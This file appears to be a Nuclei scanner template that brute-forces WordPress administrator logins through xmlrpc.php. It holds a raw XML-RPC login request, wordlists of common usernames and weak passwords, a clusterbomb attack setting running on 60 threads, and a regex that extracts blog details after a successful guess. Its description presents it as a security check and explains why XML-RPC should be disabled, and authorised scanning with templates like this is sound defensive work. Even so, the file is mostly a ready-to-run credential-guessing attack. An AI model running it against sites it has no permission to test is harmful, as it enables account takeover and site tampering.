id:  wp-xmlrpc-bruteforce
info:
  name: WordPress XML-RPC Bruteforce
  author: Caddyshack2175
  severity: critical
  description: | 
    This functionality is still included with WordPress dispite the fact that XML-RPC is largely outdated. The xmlrpc.php file is typically stored in the root directory of the site. 
    If the version of WordPress running is up-to-date, and uses the REST API to communicate with external systems, you should disable xmlrpc.php. Each time xmlrpc.php makes a request,
    it sends the username and password for authentication. This can present a significant security risk and is something that the REST API does not do.
    Due to the fact that xmlrpc.php sends authentication information with every request. The XMLRPC function does not restrict of prevent authentication attempts, which is why a 
    brute-force attack of this nature may allow an attacker to; insert content or delete code.
  reference:
    - https://kinsta.com/blog/xmlrpc-php/#why-you-should-disable-xmlrpcphp
    - https://kinsta.com/blog/xmlrpc-php/#brute-force-attacks-via-xmlrpc
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L
    cvss-score: 9.4
  tags: information, discloser, wordpress, enum, xmlrpc, xmlrpc-login, xmlrpc-bf, brute-force

http:
  - raw:
      - |
        POST /xmlrpc.php HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36
        Connection: close

        <methodCall>
        <methodName>wp.getUsersBlogs</methodName>
        <params>
        <param><value>{{username}}</value></param>
        <param><value>{{password}}</value></param>
        </params>
        </methodCall>

    payloads:
      username:
        - adm
        - admin
        - user
        - admin1
        - hostname
        - manager
        - qwerty
        - root
        - support
        - sysadmin
        - test
        - wordpress
      password:
        - admin
        - 123456
        - password
        - 12345678
        - 666666
        - 111111
        - 1234567
        - qwerty
        - siteadmin
        - administrator
        - root
        - 123123
        - 123321
        - 1234567890
        - letmein123
        - test123
        - demo123
        - pass123
        - 123qwe
        - qwe123
        - 654321
        - loveyou
        - adminadmin123
    attack: clusterbomb
    threads: 60
    redirects: false
    stop-at-first-match: false
    extractors:
      - type: regex
        name: WordPress XMLRPC Bruteforce
        group: 1
        regex:
          - '<member><name>(.*)</name><value>'
